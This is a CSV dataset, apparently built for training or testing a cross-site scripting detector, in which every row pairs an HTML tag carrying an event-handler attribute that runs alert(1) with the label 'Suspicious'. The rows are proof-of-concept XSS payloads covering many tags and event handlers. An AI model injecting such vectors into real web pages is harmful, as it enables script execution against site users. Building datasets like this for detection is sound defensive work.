WebString,Label
<center id=x tabindex=1 onfocusin=alert(1)></center>,Suspicious
"<center onbeforecopy=""alert(1)"" contenteditable>test</center>",Suspicious
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",Suspicious
"<center onbeforepaste=""alert(1)"" contenteditable>test</center>",Suspicious
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,Suspicious
"<center onclick=""alert(1)"">test</center>",Suspicious
"<center oncontextmenu=""alert(1)"">test</center>",Suspicious
"<center oncopy=""alert(1)"" contenteditable>test</center>",Suspicious
"<center oncut=""alert(1)"" contenteditable>test</center>",Suspicious
"<center ondblclick=""alert(1)"">test</center>",Suspicious
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>,Suspicious
"<center onkeydown=""alert(1)"" contenteditable>test</center>",Suspicious
"<center onkeypress=""alert(1)"" contenteditable>test</center>",Suspicious
"<center onkeyup=""alert(1)"" contenteditable>test</center>",Suspicious
"<center onmousedown=""alert(1)"">test</center>",Suspicious
"<center onmouseenter=""alert(1)"">test</center>",Suspicious
"<center onmouseleave=""alert(1)"">test</center>",Suspicious
"<center onmousemove=""alert(1)"">test</center>",Suspicious
"<center onmouseout=""alert(1)"">test</center>",Suspicious
"<center onmouseover=""alert(1)"">test</center>",Suspicious
"<center onmouseup=""alert(1)"">test</center>",Suspicious
"<center onpaste=""alert(1)"" contenteditable>test</center>",Suspicious
"<cite draggable=""true"" ondrag=""alert(1)"">test</cite>",Suspicious
"<cite draggable=""true"" ondragend=""alert(1)"">test</cite>",Suspicious
"<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>",Suspicious
"<cite draggable=""true"" ondragleave=""alert(1)"">test</cite>",Suspicious
"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",Suspicious
<cite id=x tabindex=1 onactivate=alert(1)></cite>,Suspicious
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,Suspicious
<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>,Suspicious
<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>,Suspicious
<cite id=x tabindex=1 onfocus=alert(1)></cite>,Suspicious
<cite id=x tabindex=1 onfocusin=alert(1)></cite>,Suspicious
"<cite onbeforecopy=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",Suspicious
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,Suspicious
"<cite onclick=""alert(1)"">test</cite>",Suspicious
"<cite oncontextmenu=""alert(1)"">test</cite>",Suspicious
"<cite oncopy=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite oncut=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite ondblclick=""alert(1)"">test</cite>",Suspicious
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,Suspicious
"<cite onkeydown=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite onkeypress=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",Suspicious
"<cite onmousedown=""alert(1)"">test</cite>",Suspicious
"<cite onmouseenter=""alert(1)"">test</cite>",Suspicious
"<cite onmouseleave=""alert(1)"">test</cite>",Suspicious
"<cite onmousemove=""alert(1)"">test</cite>",Suspicious
"<cite onmouseout=""alert(1)"">test</cite>",Suspicious
"<cite onmouseover=""alert(1)"">test</cite>",Suspicious
"<cite onmouseup=""alert(1)"">test</cite>",Suspicious
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",Suspicious
"<code draggable=""true"" ondrag=""alert(1)"">test</code>",Suspicious
"<code draggable=""true"" ondragend=""alert(1)"">test</code>",Suspicious
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",Suspicious
"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",Suspicious
"<code draggable=""true"" ondragstart=""alert(1)"">test</code>",Suspicious
<code id=x tabindex=1 onactivate=alert(1)></code>,Suspicious
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,Suspicious
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,Suspicious
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,Suspicious
<code id=x tabindex=1 onfocus=alert(1)></code>,Suspicious
<code id=x tabindex=1 onfocusin=alert(1)></code>,Suspicious
"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",Suspicious
"<code onbeforecut=""alert(1)"" contenteditable>test</code>",Suspicious
"<code onbeforepaste=""alert(1)"" contenteditable>test</code>",Suspicious
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>,Suspicious
"<code onclick=""alert(1)"">test</code>",Suspicious
"<code oncontextmenu=""alert(1)"">test</code>",Suspicious
"<code oncopy=""alert(1)"" contenteditable>test</code>",Suspicious
"<code oncut=""alert(1)"" contenteditable>test</code>",Suspicious
"<code ondblclick=""alert(1)"">test</code>",Suspicious
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,Suspicious
"<code onkeydown=""alert(1)"" contenteditable>test</code>",Suspicious
"<code onkeypress=""alert(1)"" contenteditable>test</code>",Suspicious
"<code onkeyup=""alert(1)"" contenteditable>test</code>",Suspicious
"<code onmousedown=""alert(1)"">test</code>",Suspicious
"<code onmouseenter=""alert(1)"">test</code>",Suspicious
"<code onmouseleave=""alert(1)"">test</code>",Suspicious
"<code onmousemove=""alert(1)"">test</code>",Suspicious
"<code onmouseout=""alert(1)"">test</code>",Suspicious
"<code onmouseover=""alert(1)"">test</code>",Suspicious
"<code onmouseup=""alert(1)"">test</code>",Suspicious
"<code onpaste=""alert(1)"" contenteditable>test</code>",Suspicious
"<col draggable=""true"" ondrag=""alert(1)"">test</col>",Suspicious
"<col draggable=""true"" ondragend=""alert(1)"">test</col>",Suspicious
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",Suspicious
"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",Suspicious
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",Suspicious
<col id=x tabindex=1 onactivate=alert(1)></col>,Suspicious
<col id=x tabindex=1 onbeforeactivate=alert(1)></col>,Suspicious
<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>,Suspicious
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,Suspicious
<col id=x tabindex=1 onfocus=alert(1)></col>,Suspicious
<col id=x tabindex=1 onfocusin=alert(1)></col>,Suspicious
"<col onbeforecopy=""alert(1)"" contenteditable>test</col>",Suspicious
"<col onbeforecut=""alert(1)"" contenteditable>test</col>",Suspicious
"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",Suspicious
<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>,Suspicious
"<col onclick=""alert(1)"">test</col>",Suspicious
"<col oncontextmenu=""alert(1)"">test</col>",Suspicious
"<col oncopy=""alert(1)"" contenteditable>test</col>",Suspicious
"<col oncut=""alert(1)"" contenteditable>test</col>",Suspicious
"<col ondblclick=""alert(1)"">test</col>",Suspicious
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,Suspicious
"<col onkeydown=""alert(1)"" contenteditable>test</col>",Suspicious
"<col onkeypress=""alert(1)"" contenteditable>test</col>",Suspicious
"<col onkeyup=""alert(1)"" contenteditable>test</col>",Suspicious
"<col onmousedown=""alert(1)"">test</col>",Suspicious
"<col onmouseenter=""alert(1)"">test</col>",Suspicious
"<col onmouseleave=""alert(1)"">test</col>",Suspicious
"<col onmousemove=""alert(1)"">test</col>",Suspicious
"<col onmouseout=""alert(1)"">test</col>",Suspicious
"<col onmouseover=""alert(1)"">test</col>",Suspicious
"<col onmouseup=""alert(1)"">test</col>",Suspicious
"<col onpaste=""alert(1)"" contenteditable>test</col>",Suspicious
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",Suspicious
"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",Suspicious
"<colgroup draggable=""true"" ondragenter=""alert(1)"">test</colgroup>",Suspicious
"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",Suspicious
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",Suspicious
<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>,Suspicious
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,Suspicious
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,Suspicious
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,Suspicious
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,Suspicious
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,Suspicious
"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup onbeforecut=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup onbeforepaste=""alert(1)"" contenteditable>test</colgroup>",Suspicious
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,Suspicious
"<colgroup onclick=""alert(1)"">test</colgroup>",Suspicious
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",Suspicious
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup ondblclick=""alert(1)"">test</colgroup>",Suspicious
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,Suspicious
"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup onkeypress=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup onkeyup=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<colgroup onmousedown=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmouseleave=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmousemove=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmouseout=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmouseover=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onmouseup=""alert(1)"">test</colgroup>",Suspicious
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",Suspicious
"<command draggable=""true"" ondrag=""alert(1)"">test</command>",Suspicious
"<command draggable=""true"" ondragend=""alert(1)"">test</command>",Suspicious
"<command draggable=""true"" ondragenter=""alert(1)"">test</command>",Suspicious
"<command draggable=""true"" ondragleave=""alert(1)"">test</command>",Suspicious
"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",Suspicious
<command id=x tabindex=1 onactivate=alert(1)></command>,Suspicious
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,Suspicious
<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>,Suspicious
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,Suspicious
<command id=x tabindex=1 onfocus=alert(1)></command>,Suspicious
<command id=x tabindex=1 onfocusin=alert(1)></command>,Suspicious
"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",Suspicious
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",Suspicious
"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",Suspicious
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,Suspicious
"<command onclick=""alert(1)"">test</command>",Suspicious
"<command oncontextmenu=""alert(1)"">test</command>",Suspicious
"<command oncopy=""alert(1)"" contenteditable>test</command>",Suspicious
"<command oncut=""alert(1)"" contenteditable>test</command>",Suspicious
"<command ondblclick=""alert(1)"">test</command>",Suspicious
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,Suspicious
"<command onkeydown=""alert(1)"" contenteditable>test</command>",Suspicious
"<command onkeypress=""alert(1)"" contenteditable>test</command>",Suspicious
"<command onkeyup=""alert(1)"" contenteditable>test</command>",Suspicious
"<command onmousedown=""alert(1)"">test</command>",Suspicious
"<command onmouseenter=""alert(1)"">test</command>",Suspicious
"<command onmouseleave=""alert(1)"">test</command>",Suspicious
"<command onmousemove=""alert(1)"">test</command>",Suspicious
"<command onmouseout=""alert(1)"">test</command>",Suspicious
"<command onmouseover=""alert(1)"">test</command>",Suspicious
"<command onmouseup=""alert(1)"">test</command>",Suspicious
"<command onpaste=""alert(1)"" contenteditable>test</command>",Suspicious
"<content draggable=""true"" ondrag=""alert(1)"">test</content>",Suspicious
"<content draggable=""true"" ondragend=""alert(1)"">test</content>",Suspicious
"<content draggable=""true"" ondragenter=""alert(1)"">test</content>",Suspicious
"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",Suspicious
"<content draggable=""true"" ondragstart=""alert(1)"">test</content>",Suspicious
<content id=x tabindex=1 onactivate=alert(1)></content>,Suspicious
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,Suspicious
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,Suspicious
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,Suspicious
<content id=x tabindex=1 onfocus=alert(1)></content>,Suspicious
<content id=x tabindex=1 onfocusin=alert(1)></content>,Suspicious
"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",Suspicious
"<content onbeforecut=""alert(1)"" contenteditable>test</content>",Suspicious
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",Suspicious
<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,Suspicious
"<content onclick=""alert(1)"">test</content>",Suspicious
"<content oncontextmenu=""alert(1)"">test</content>",Suspicious
"<content oncopy=""alert(1)"" contenteditable>test</content>",Suspicious
"<content oncut=""alert(1)"" contenteditable>test</content>",Suspicious
"<content ondblclick=""alert(1)"">test</content>",Suspicious
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,Suspicious
"<content onkeydown=""alert(1)"" contenteditable>test</content>",Suspicious
"<content onkeypress=""alert(1)"" contenteditable>test</content>",Suspicious
"<content onkeyup=""alert(1)"" contenteditable>test</content>",Suspicious
"<content onmousedown=""alert(1)"">test</content>",Suspicious
"<content onmouseenter=""alert(1)"">test</content>",Suspicious
"<content onmouseleave=""alert(1)"">test</content>",Suspicious
"<content onmousemove=""alert(1)"">test</content>",Suspicious
"<content onmouseout=""alert(1)"">test</content>",Suspicious
"<content onmouseover=""alert(1)"">test</content>",Suspicious
"<content onmouseup=""alert(1)"">test</content>",Suspicious
"<content onpaste=""alert(1)"" contenteditable>test</content>",Suspicious
"<data draggable=""true"" ondrag=""alert(1)"">test</data>",Suspicious
"<data draggable=""true"" ondragend=""alert(1)"">test</data>",Suspicious
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",Suspicious
"<data draggable=""true"" ondragleave=""alert(1)"">test</data>",Suspicious
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",Suspicious
<data id=x tabindex=1 onactivate=alert(1)></data>,Suspicious
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,Suspicious
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,Suspicious
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,Suspicious
<data id=x tabindex=1 onfocus=alert(1)></data>,Suspicious
<data id=x tabindex=1 onfocusin=alert(1)></data>,Suspicious
"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",Suspicious
"<data onbeforecut=""alert(1)"" contenteditable>test</data>",Suspicious
"<data onbeforepaste=""alert(1)"" contenteditable>test</data>",Suspicious
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,Suspicious
"<data onclick=""alert(1)"">test</data>",Suspicious
"<data oncontextmenu=""alert(1)"">test</data>",Suspicious
"<data oncopy=""alert(1)"" contenteditable>test</data>",Suspicious
"<data oncut=""alert(1)"" contenteditable>test</data>",Suspicious
"<data ondblclick=""alert(1)"">test</data>",Suspicious
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,Suspicious
"<data onkeydown=""alert(1)"" contenteditable>test</data>",Suspicious
"<data onkeypress=""alert(1)"" contenteditable>test</data>",Suspicious
"<data onkeyup=""alert(1)"" contenteditable>test</data>",Suspicious
"<data onmousedown=""alert(1)"">test</data>",Suspicious
"<data onmouseenter=""alert(1)"">test</data>",Suspicious
"<data onmouseleave=""alert(1)"">test</data>",Suspicious
"<data onmousemove=""alert(1)"">test</data>",Suspicious
"<data onmouseout=""alert(1)"">test</data>",Suspicious
"<data onmouseover=""alert(1)"">test</data>",Suspicious
"<data onmouseup=""alert(1)"">test</data>",Suspicious
"<data onpaste=""alert(1)"" contenteditable>test</data>",Suspicious
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",Suspicious
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",Suspicious
"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",Suspicious
"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",Suspicious
"<datalist draggable=""true"" ondragstart=""alert(1)"">test</datalist>",Suspicious
<datalist id=x tabindex=1 onactivate=alert(1)></datalist>,Suspicious
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,Suspicious
<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>,Suspicious
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,Suspicious
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,Suspicious
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,Suspicious
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist onbeforecut=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist onbeforepaste=""alert(1)"" contenteditable>test</datalist>",Suspicious
<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>,Suspicious
"<datalist onclick=""alert(1)"">test</datalist>",Suspicious
"<datalist oncontextmenu=""alert(1)"">test</datalist>",Suspicious
"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist oncut=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist ondblclick=""alert(1)"">test</datalist>",Suspicious
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,Suspicious
"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<datalist onmousedown=""alert(1)"">test</datalist>",Suspicious
"<datalist onmouseenter=""alert(1)"">test</datalist>",Suspicious
"<datalist onmouseleave=""alert(1)"">test</datalist>",Suspicious
"<datalist onmousemove=""alert(1)"">test</datalist>",Suspicious
"<datalist onmouseout=""alert(1)"">test</datalist>",Suspicious
"<datalist onmouseover=""alert(1)"">test</datalist>",Suspicious
"<datalist onmouseup=""alert(1)"">test</datalist>",Suspicious
"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",Suspicious
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",Suspicious
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",Suspicious
"<dd draggable=""true"" ondragenter=""alert(1)"">test</dd>",Suspicious
"<dd draggable=""true"" ondragleave=""alert(1)"">test</dd>",Suspicious
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",Suspicious
<dd id=x tabindex=1 onactivate=alert(1)></dd>,Suspicious
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,Suspicious
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,Suspicious
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,Suspicious
<dd id=x tabindex=1 onfocus=alert(1)></dd>,Suspicious
<dd id=x tabindex=1 onfocusin=alert(1)></dd>,Suspicious
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd onbeforecut=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",Suspicious
<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>,Suspicious
"<dd onclick=""alert(1)"">test</dd>",Suspicious
"<dd oncontextmenu=""alert(1)"">test</dd>",Suspicious
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd oncut=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd ondblclick=""alert(1)"">test</dd>",Suspicious
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,Suspicious
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",Suspicious
"<dd onmousedown=""alert(1)"">test</dd>",Suspicious
"<dd onmouseenter=""alert(1)"">test</dd>",Suspicious
"<dd onmouseleave=""alert(1)"">test</dd>",Suspicious
"<dd onmousemove=""alert(1)"">test</dd>",Suspicious
"<dd onmouseout=""alert(1)"">test</dd>",Suspicious
"<dd onmouseover=""alert(1)"">test</dd>",Suspicious
"<dd onmouseup=""alert(1)"">test</dd>",Suspicious
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",Suspicious
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",Suspicious
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",Suspicious
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",Suspicious
"<del draggable=""true"" ondragleave=""alert(1)"">test</del>",Suspicious
"<del draggable=""true"" ondragstart=""alert(1)"">test</del>",Suspicious
<del id=x tabindex=1 onactivate=alert(1)></del>,Suspicious
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,Suspicious
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,Suspicious
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,Suspicious
<del id=x tabindex=1 onfocus=alert(1)></del>,Suspicious
<del id=x tabindex=1 onfocusin=alert(1)></del>,Suspicious
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",Suspicious
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",Suspicious
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",Suspicious
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,Suspicious
"<del onclick=""alert(1)"">test</del>",Suspicious
"<del oncontextmenu=""alert(1)"">test</del>",Suspicious
"<del oncopy=""alert(1)"" contenteditable>test</del>",Suspicious
"<del oncut=""alert(1)"" contenteditable>test</del>",Suspicious
"<del ondblclick=""alert(1)"">test</del>",Suspicious
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,Suspicious
"<del onkeydown=""alert(1)"" contenteditable>test</del>",Suspicious
"<del onkeypress=""alert(1)"" contenteditable>test</del>",Suspicious
"<del onkeyup=""alert(1)"" contenteditable>test</del>",Suspicious
"<del onmousedown=""alert(1)"">test</del>",Suspicious
"<del onmouseenter=""alert(1)"">test</del>",Suspicious
"<del onmouseleave=""alert(1)"">test</del>",Suspicious
"<del onmousemove=""alert(1)"">test</del>",Suspicious
"<del onmouseout=""alert(1)"">test</del>",Suspicious
"<del onmouseover=""alert(1)"">test</del>",Suspicious
"<del onmouseup=""alert(1)"">test</del>",Suspicious
"<del onpaste=""alert(1)"" contenteditable>test</del>",Suspicious
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",Suspicious
"<details draggable=""true"" ondragend=""alert(1)"">test</details>",Suspicious
"<details draggable=""true"" ondragenter=""alert(1)"">test</details>",Suspicious
"<details draggable=""true"" ondragleave=""alert(1)"">test</details>",Suspicious
"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",Suspicious
<details id=x tabindex=1 onactivate=alert(1)></details>,Suspicious
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,Suspicious
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,Suspicious
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,Suspicious
<details id=x tabindex=1 onfocus=alert(1)></details>,Suspicious
<details id=x tabindex=1 onfocusin=alert(1)></details>,Suspicious
"<details onbeforecopy=""alert(1)"" contenteditable>test</details>",Suspicious
"<details onbeforecut=""alert(1)"" contenteditable>test</details>",Suspicious
"<details onbeforepaste=""alert(1)"" contenteditable>test</details>",Suspicious
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,Suspicious
"<details onclick=""alert(1)"">test</details>",Suspicious
"<details oncontextmenu=""alert(1)"">test</details>",Suspicious
"<details oncopy=""alert(1)"" contenteditable>test</details>",Suspicious
"<details oncut=""alert(1)"" contenteditable>test</details>",Suspicious
"<details ondblclick=""alert(1)"">test</details>",Suspicious
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,Suspicious
"<details onkeydown=""alert(1)"" contenteditable>test</details>",Suspicious
"<details onkeypress=""alert(1)"" contenteditable>test</details>",Suspicious
"<details onkeyup=""alert(1)"" contenteditable>test</details>",Suspicious
"<details onmousedown=""alert(1)"">test</details>",Suspicious
"<details onmouseenter=""alert(1)"">test</details>",Suspicious
"<details onmouseleave=""alert(1)"">test</details>",Suspicious
"<details onmousemove=""alert(1)"">test</details>",Suspicious
"<details onmouseout=""alert(1)"">test</details>",Suspicious
"<details onmouseover=""alert(1)"">test</details>",Suspicious
"<details onmouseup=""alert(1)"">test</details>",Suspicious
"<details onpaste=""alert(1)"" contenteditable>test</details>",Suspicious
<details ontoggle=alert(1) open>test</details>,Suspicious
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",Suspicious
"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>",Suspicious
"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",Suspicious
"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",Suspicious
"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>",Suspicious
<dfn id=x tabindex=1 onactivate=alert(1)></dfn>,Suspicious
<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>,Suspicious
<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>,Suspicious
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,Suspicious
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,Suspicious
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>,Suspicious
"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn onbeforecut=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn onbeforepaste=""alert(1)"" contenteditable>test</dfn>",Suspicious
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,Suspicious
"<dfn onclick=""alert(1)"">test</dfn>",Suspicious
"<dfn oncontextmenu=""alert(1)"">test</dfn>",Suspicious
"<dfn oncopy=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn ondblclick=""alert(1)"">test</dfn>",Suspicious
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,Suspicious
"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn onkeyup=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dfn onmousedown=""alert(1)"">test</dfn>",Suspicious
"<dfn onmouseenter=""alert(1)"">test</dfn>",Suspicious
"<dfn onmouseleave=""alert(1)"">test</dfn>",Suspicious
"<dfn onmousemove=""alert(1)"">test</dfn>",Suspicious
"<dfn onmouseout=""alert(1)"">test</dfn>",Suspicious
"<dfn onmouseover=""alert(1)"">test</dfn>",Suspicious
